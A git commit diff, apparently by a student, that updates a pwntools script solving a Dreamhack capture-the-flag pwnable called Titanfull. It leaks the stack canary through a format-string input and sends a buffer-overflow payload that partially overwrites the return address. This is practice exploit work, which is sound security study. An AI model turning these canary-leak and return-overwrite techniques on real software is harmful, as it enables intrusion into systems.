6e13cb0ed1e06226d3de137fdf425f90ade55042
Brian Lee <hibrian827@gmail.com>
2025-03-16 22:42:59 +0900

    solving titanfall

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,9 +1,18 @@
 from pwn import *
 
 rem = process("./Pwnable/Titanfull/problem/titanfull")
-gdb.attach(rem)
 
-rem.sendlineafter(b"> ", b"%p")
-print(rem.recvline())
+elf = ELF("./Pwnable/Titanfull/problem/titanfull")
+
+main_addr = elf.symbols['main']
+bss_addr = elf.bss()
+
+rem.sendlineafter(b"> ", b"%17$p")
+rem.recvuntil(b"0x")
+canary = int(rem.recvn(16), 16)
+
+rem.sendlineafter(b"> ", b"7274")
+payload = b"A" * 0x18 + p64(canary) + p64(bss_addr) + p64(main_addr)[0:2]
+rem.sendlineafter(b": ", payload)
 
 rem.interactive()
